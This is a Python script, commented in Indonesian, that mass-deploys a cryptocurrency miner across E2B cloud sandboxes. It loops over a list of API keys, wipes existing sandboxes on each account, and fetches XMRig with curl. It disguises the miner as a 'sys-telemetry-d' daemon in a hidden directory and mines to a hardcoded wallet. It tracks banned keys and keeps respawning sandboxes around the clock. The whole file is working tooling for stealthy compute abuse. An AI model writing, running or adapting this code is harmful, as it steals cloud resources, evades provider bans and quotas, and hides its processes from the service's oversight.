import os
import sys
import time
import json
import signal
import argparse
import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Pastikan console stdout mendukung UTF-8 di Windows dan unbuffered
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except Exception:
        pass

# Cek import E2B SDK
try:
    from e2b import Sandbox, Template
except ImportError:
    print("[ERROR] E2B SDK belum terinstall! Silakan install: pip install e2b requests")
    sys.exit(1)

# Default Fallback Config (8-Core 8-Thread XMRig Pure Cloud Setup)
DEFAULT_CONFIG = {
    "template_name": "core-yok7h-t41",
    "slots_per_key": 20,
    "cpu_count": 8,
    "mining_threads": 8,
    "memory_mb": 8192,
    "sandbox_timeout_seconds": 3000,
    "duration_minutes": 50,
    "auto_respawn": True,
    "wallet_user": "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM.Sekay77",
    "pool_url": "rx.unmineable.com:443",
    "algorithm": "rx/0",
    "tls": True,
    "keys_file": "list.txt",
    "concurrency_limit": 3,
    "spawn_delay_seconds": 1.0
}

CONFIG_FILE = "config_xmrig.json" if os.path.exists("config_xmrig.json") else "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8-sig") as f:
                data = json.load(f)
                merged = DEFAULT_CONFIG.copy()
                merged.update(data)
                return merged
        except Exception as e:
            print(f"[!] Gagal membaca {CONFIG_FILE}: {e}. Menggunakan default.")
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"[!] Gagal menyimpan {CONFIG_FILE}: {e}")

# Global State Tracker
is_running = True
active_sandboxes = {} # worker_key -> info dict
banned_keys = set()
quota_keys = set()
lock = threading.Lock()

# Camouflaged System Daemon Directory & Process Mask
SYS_DIR = "/var/tmp/.sys-telemetry-d"
SYS_BIN = "sys-telemetry-d"
SYS_CONF = "sys-telemetry.conf"
LOG_FILE = "/tmp/e2b_miner.log"

def build_config_json_content(cfg):
    pool = cfg.get("pool_url", "rx.unmineable.com:443")
    clean_pool = pool if pool.startswith("stratum+ssl://") else f"stratum+ssl://{pool}"
    wallet = cfg.get("wallet_user", "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM.Sekay77")
    algo = cfg.get("algorithm", "rx/0")

    return json.dumps({
        "autosave": False,
        "cpu": {
            "enabled": True,
            "max-threads-hint": 100,
            "hugepages": True
        },
        "opencl": False,
        "cuda": False,
        "pools": [
            {
                "algo": algo,
                "coin": None,
                "url": clean_pool,
                "user": wallet,
                "pass": "x",
                "tls": True,
                "keepalive": True
            }
        ]
    }, indent=2)

def ensure_template_exists(api_key, template_name="core-yok7h-t41", cpu_count=8, memory_mb=8192, label="E2B"):
    """Cek ketersediaan template di akun E2B; jika belum ada, otomatis build template 8 vCPU & 8GB RAM dengan pre-installed binary"""
    if not template_name or template_name.lower() == "base":
        return "base"
    
    try:
        if Template.exists(template_name, api_key=api_key):
            print(f"[{label}] ✅ Template 8-Core '{template_name}' siap di akun ini.")
            return template_name
        
        print(f"[{label}] 📦 Template '{template_name}' belum ada di akun E2B ini.")
        print(f"[{label}] 🔨 Memulai auto-build template '{template_name}' (8 vCPU, 8GB RAM + Pre-installed Binary)...")
        
        builder = (
            Template()
            .from_template("base")
            .run_cmd(
                f"mkdir -p {SYS_DIR} && "
                f"curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/.xmrig.tar.gz && "
                f"tar -xzf /tmp/.xmrig.tar.gz -C /tmp && "
                f"mv /tmp/xmrig-6.22.2/xmrig {SYS_DIR}/{SYS_BIN} && "
                f"chmod +x {SYS_DIR}/{SYS_BIN} && "
                f"rm -rf /tmp/.xmrig.tar.gz /tmp/xmrig-6.22.2"
            )
        )
        build_info = Template.build(
            builder,
            name=template_name,
            cpu_count=cpu_count,
            memory_mb=memory_mb,
            api_key=api_key
        )
        print(f"[{label}] 🎉 Template '{template_name}' BERHASIL DI-BUILD (8 vCPU & 8GB RAM)! Deploy akan instan!")
        return template_name
    except Exception as e:
        print(f"[{label}] ⚠️ Info build template '{template_name}': {e}. Menggunakan 'base'.")
        return "base"

def clean_remote_orphan_sandboxes(api_key, label="E2B"):
    """Bersihkan sandbox lama/orphan di cloud via REST API E2B secara cepat & paralel"""
    try:
        headers = {"X-API-Key": api_key, "Accept": "application/json"}
        resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
        if resp.status_code in (401, 403):
            print(f"[{label}] 🚫 Akun/Team terindikasi BANNED/INVALID (HTTP {resp.status_code}). Menandai token.")
            with lock:
                banned_keys.add(api_key)
            return
        if resp.status_code == 200:
            data = resp.json()
            sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
            if sandboxes:
                print(f"[{label}] 🧹 Ditemukan {len(sandboxes)} sandbox aktif di cloud. Membersihkan secara paralel...")
                def delete_one(s):
                    s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
                    if s_id:
                        try:
                            requests.delete(f"https://api.e2b.dev/sandboxes/{s_id}", headers=headers, timeout=5)
                        except Exception:
                            pass
                with ThreadPoolExecutor(max_workers=15) as ex:
                    list(ex.map(delete_one, sandboxes))
                time.sleep(1)
                print(f"[{label}] ✅ Cloud sandbox bersih.")
    except Exception as e:
        pass

def parse_keys_file(filepath):
    if not os.path.exists(filepath):
        return []
    
    accounts = []
    with open(filepath, "r", encoding="utf-8-sig") as f:
        for line_no, raw_line in enumerate(f, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            
            label = f"key-{line_no}"
            token = ""

            if "|" in line:
                parts = [p.strip() for p in line.split("|")]
                found_token = None
                for part in parts:
                    if part.startswith("e2b_"):
                        found_token = part
                        break
                
                if found_token:
                    token = found_token
                    label = parts[0] if parts[0] != token else f"user-{line_no}"
                else:
                    if len(parts) >= 2:
                        label = parts[0]
                        token = parts[1]
                    else:
                        token = parts[0]
            else:
                token = line.strip()

            if token:
                accounts.append({
                    "index": line_no,
                    "label": label,
                    "token": token
                })
    return accounts

def spawn_single_sandbox(cfg, account, slot_index):
    token = account["token"]
    label = account["label"]
    worker_name = f"{label.replace(' ', '_')}-8core-slot-{slot_index}"
    worker_key = f"{token[:12]}-{slot_index}"
    timeout_sec = cfg.get("sandbox_timeout_seconds", 3000)
    threads = cfg.get("mining_threads", 8)

    if token in banned_keys:
        return {"status": "banned", "worker_name": worker_name, "error": "Team is banned"}
    if token in quota_keys:
        return {"status": "quota_limit", "worker_name": worker_name, "error": "Quota limit reached"}

    template_name = account.get("ready_template") or cfg.get("template_name", "core-yok7h-t41")
    print(f"   🚀 [{label}] Memulai Sandbox Slot #{slot_index} ({worker_name}) [Tpl: {template_name}]...")
    sbx = None

    try:
        # Spawn Sandbox dengan E2B SDK (Template 8 vCPU)
        try:
            sbx = Sandbox.create(
                template=template_name,
                api_key=token,
                timeout=timeout_sec,
                request_timeout=60,
                envs={
                    "WORKER_NAME": worker_name,
                    "BOT_LABEL": worker_name,
                    "MINER_THREADS": str(threads),
                    "MINER_WALLET": cfg.get("wallet_user", ""),
                    "MINER_POOL": cfg.get("pool_url", "")
                }
            )
        except Exception as tpl_err:
            if "not found" in str(tpl_err).lower() and template_name != "base":
                print(f"      ⚠️ Template '{template_name}' tidak ditemukan, fallback ke 'base'...")
                sbx = Sandbox.create(
                    template="base",
                    api_key=token,
                    timeout=timeout_sec,
                    request_timeout=60,
                    envs={
                        "WORKER_NAME": worker_name,
                        "BOT_LABEL": worker_name,
                        "MINER_THREADS": str(threads),
                        "MINER_WALLET": cfg.get("wallet_user", ""),
                        "MINER_POOL": cfg.get("pool_url", "")
                    }
                )
            else:
                raise tpl_err

        sandbox_id = sbx.sandbox_id
        print(f"      ✅ Sandbox ID [{sandbox_id}] Berhasil Dibuat (8-Core CPU)!")

        # 1. Tulis file konfigurasi langsung via E2B Filesystem API (Aman & Instan < 10ms)
        config_content = build_config_json_content(cfg)
        sbx.files.write(f"{SYS_DIR}/{SYS_CONF}", config_content)

        # 2. Pastikan binary siap (jika sudah ada di template, ini 0ms; jika fallback base, download cepat)
        setup_cmd = (
            f"[ -f {SYS_DIR}/{SYS_BIN} ] || ("
            f"mkdir -p {SYS_DIR} && "
            f"curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/.xmrig.tar.gz && "
            f"tar -xzf /tmp/.xmrig.tar.gz -C /tmp && "
            f"mv /tmp/xmrig-6.22.2/xmrig {SYS_DIR}/{SYS_BIN} && "
            f"chmod +x {SYS_DIR}/{SYS_BIN} && "
            f"rm -rf /tmp/.xmrig.tar.gz /tmp/xmrig-6.22.2)"
        )
        sbx.commands.run(setup_cmd, timeout=30)

        # 3. Jalankan Miner di Background sebagai Detached Daemon (100% Persisten)
        cmd_str = (
            f"(nohup {SYS_DIR}/{SYS_BIN} "
            f"--config={SYS_DIR}/{SYS_CONF} "
            f"--threads={threads} "
            f"--log-file={LOG_FILE} "
            f"--print-time=10 </dev/null >/dev/null 2>&1 &)"
        )
        sbx.commands.run(cmd_str)

        now = datetime.now()
        expires_at = now + timedelta(seconds=timeout_sec)

        info = {
            "worker_name": worker_name,
            "sandbox_id": sandbox_id,
            "token": token,
            "label": label,
            "slot_index": slot_index,
            "created_at": now,
            "expires_at": expires_at,
            "sbx_obj": sbx,
            "status": "RUNNING"
        }

        with lock:
            active_sandboxes[worker_key] = info

        print(f"      🔥 [ACTIVE] {worker_name} ({threads}-Threads 8-Core) AKTIF & MINING! (Timeout: {timeout_sec//60}m)\n")
        return {"status": "success", "info": info}

    except Exception as e:
        err_msg = str(e)
        print(f"      ❌ Gagal spawn {worker_name}: {err_msg}")

        # Jika gagal saat setup, kill sandbox agar slot tidak terbuang
        if sbx:
            try:
                sbx.kill()
            except Exception:
                pass

        if "banned" in err_msg.lower() or "403" in err_msg or "unauthorized" in err_msg.lower():
            print(f"      🚫 Akun/Team {label} terindikasi BANNED/INVALID oleh E2B.")
            with lock:
                banned_keys.add(token)
            return {"status": "banned", "worker_name": worker_name, "error": err_msg}

        if "limit" in err_msg.lower() or "quota" in err_msg.lower() or "rate" in err_msg.lower() or "429" in err_msg:
            print(f"      ⚠️ Kuota/Rate Limit (Max 20 Sandboxes) tercapai untuk {label}.")
            with lock:
                quota_keys.add(token)
            return {"status": "quota_limit", "worker_name": worker_name, "error": err_msg}

        return {"status": "error", "worker_name": worker_name, "error": err_msg}

def deploy_all(cfg, accounts):
    slots = cfg.get("slots_per_key", 20)
    concurrency = cfg.get("concurrency_limit", 20)
    template_target = cfg.get("template_name", "core-yok7h-t41")

    # Bersihkan orphan sandbox & pastikan template 8-Core siap sebelum mulai (Paralel)
    def prepare_account(acc):
        if acc["token"] not in banned_keys:
            clean_remote_orphan_sandboxes(acc["token"], acc["label"])
            tpl = ensure_template_exists(acc["token"], template_target, cfg.get("cpu_count", 8), cfg.get("memory_mb", 8192), acc["label"])
            acc["ready_template"] = tpl
        return acc

    with ThreadPoolExecutor(max_workers=max(1, len(accounts))) as ex:
        accounts = list(ex.map(prepare_account, accounts))

    tasks = []
    for acc in accounts:
        token = acc["token"]
        if token in banned_keys:
            continue
        for slot in range(1, slots + 1):
            tasks.append((acc, slot))

    if not tasks:
        print(f"\n=======================================================")
        print(f"⚠️ Tidak ada sandbox yang dapat dideploy (Semua key Banned / Invalid).")
        print(f"=======================================================\n")
        return []

    spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
    print(f"\n=======================================================")
    print(f"📦 Total Target Sandbox: {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
    print(f"⚡ CPU per Sandbox     : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('mining_threads', 8)} Mining Threads")
    print(f"⚡ Concurrency Worker   : {concurrency} Worker Santai (Jeda: {spawn_delay}s per slot)")
    print(f"=======================================================\n")

    results = []
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = []
        for acc, slot in tasks:
            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
            futures.append(fut)
            if spawn_delay > 0:
                time.sleep(spawn_delay)

        for fut in as_completed(futures):
            res = fut.result()
            results.append(res)

    success_count = sum(1 for r in results if r["status"] == "success")
    print(f"\n=======================================================")
    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} 8-Core Sandbox Berhasil Aktif!")
    print(f"=======================================================\n")
    return results

def monitor_and_respawn_loop(cfg, accounts):
    global is_running
    slots = cfg.get("slots_per_key", 20)
    check_interval = 30
    start_time = datetime.now()

    print("🔄 Mode Auto-Respawn Daemon AKTIF. Memonitor & menjaga Sandbox 8-Core tetap hidup 24/7...")
    print("Tekan Ctrl + C untuk keluar kapan saja.\n")

    while is_running:
        try:
            now = datetime.now()
            uptime_str = str(now - start_time).split(".")[0]

            to_respawn = []
            with lock:
                for acc in accounts:
                    token = acc["token"]
                    if token in banned_keys:
                        continue
                    
                    for slot in range(1, slots + 1):
                        worker_key = f"{token[:12]}-{slot}"
                        if worker_key not in active_sandboxes:
                            to_respawn.append((acc, slot))
                        else:
                            info = active_sandboxes[worker_key]
                            remaining_sec = (info["expires_at"] - now).total_seconds()
                            if remaining_sec <= 120:
                                print(f"⏰ Sandbox {info['worker_name']} mendekati batas timeout (Sisa {int(remaining_sec)}s). Me-respawn...")
                                try:
                                    info["sbx_obj"].kill()
                                except Exception:
                                    pass
                                del active_sandboxes[worker_key]
                                to_respawn.append((acc, slot))

            if to_respawn:
                print(f"✨ Menjalankan respawn untuk {len(to_respawn)} slot...")
                with lock:
                    quota_keys.clear()
                for acc, slot in to_respawn:
                    if not is_running:
                        break
                    spawn_single_sandbox(cfg, acc, slot)
                    time.sleep(0.5)

            with lock:
                active_count = len(active_sandboxes)
                banned_count = len(banned_keys)

            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} 8-Core Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
            
            for _ in range(check_interval):
                if not is_running:
                    break
                time.sleep(1)

        except Exception as e:
            print(f"⚠️ Error pada monitor loop: {e}")
            time.sleep(5)

def signal_handler(sig, frame):
    global is_running
    print("\n\n🛑 Menerima sinyal STOP (Ctrl+C)... Menghentikan Deployer dengan aman.")
    is_running = False

def main():
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, signal_handler)

    parser = argparse.ArgumentParser(description="E2B Multi-Key 8-Core Cloud Sandbox Auto-Deployer")
    parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B (default: core-yok7h-t41 atau base)")
    parser.add_argument("--file", "-f", default=None, help="File path berisi E2B API Key (default: list.txt)")
    parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key (default: 20)")
    parser.add_argument("--timeout", "-t", type=int, default=None, help="Sandbox timeout dalam detik (default: 3000 / 50m)")
    parser.add_argument("--wallet", "-w", default=None, help="Wallet / User untuk miner payload")
    parser.add_argument("--threads", type=int, default=None, help="Threads CPU per sandbox (default: 8)")
    parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor/auto-respawn loop")
    parser.add_argument("--daemon", action="store_true", help="Paksa jalankan daemon auto-respawn 24/7")

    args = parser.parse_args()

    cfg = load_config()

    if args.template:
        cfg["template_name"] = args.template
    if args.slots:
        cfg["slots_per_key"] = args.slots
    if args.timeout:
        cfg["sandbox_timeout_seconds"] = args.timeout
    if args.wallet:
        cfg["wallet_user"] = args.wallet
    if args.threads:
        cfg["mining_threads"] = args.threads
    if args.file:
        cfg["keys_file"] = args.file

    keys_file = cfg.get("keys_file", "list.txt")
    template_name = cfg.get("template_name", "core-yok7h-t41")

    print(f"""
=============================================================
  ⚡ E2B 8-CORE MULTI-SANDBOX CLOUD AUTO-DEPLOYER (v2.0)
  🔥 8 vCPU | 8 Threads | Kamuflase sys-telemetry-d
  🛡️ 20 Slots/Key | 24/7 Auto Keep-Alive Daemon
=============================================================
""")
    print(f"⚙️  Konfigurasi:")
    print(f"   • Template E2B       : {template_name}")
    print(f"   • File Key           : {keys_file}")
    print(f"   • Slots per Key      : {cfg['slots_per_key']} Slots (Max 20/Token)")
    print(f"   • Sandbox CPU        : {cfg['cpu_count']} vCPU | RAM: {cfg.get('memory_mb', 8192)} MB")
    print(f"   • Mining Threads     : {cfg['mining_threads']} Threads (Full 8-Core)")
    print(f"   • Timeout Sandbox    : {cfg['sandbox_timeout_seconds']} detik ({cfg['sandbox_timeout_seconds']//60} menit)")
    print(f"   • Mining Pool        : {cfg['pool_url']}")
    print(f"   • Wallet/Worker      : {cfg['wallet_user']}")
    print(f"   • Kamuflase Proses   : {SYS_DIR}/{SYS_BIN}")
    print(f"   • Auto-Respawn Loop  : {'ON (24/7 Keepalive)' if (cfg['auto_respawn'] or args.daemon) and not args.once else 'OFF (One-Shot)'}")
    print(f"=============================================================\n")

    accounts = parse_keys_file(keys_file)
    if not accounts:
        print(f"❌ Error: File '{keys_file}' tidak ditemukan atau kosong!")
        print(f"ℹ️ Silakan tambahkan E2B API Key ke file '{keys_file}' (satu key per baris atau label|key).")
        sys.exit(1)

    print(f"📋 Ditemukan {len(accounts)} API Key di '{keys_file}':")
    for acc in accounts:
        print(f"   [{acc['index']}] {acc['label']} ({acc['token'][:10]}...{acc['token'][-4:]})")

    deploy_all(cfg, accounts)

    if (cfg.get("auto_respawn", True) or args.daemon) and not args.once:
        monitor_and_respawn_loop(cfg, accounts)
    else:
        print("✅ Deploy selesai. Program ditutup (One-Shot mode).")

if __name__ == "__main__":
    main()
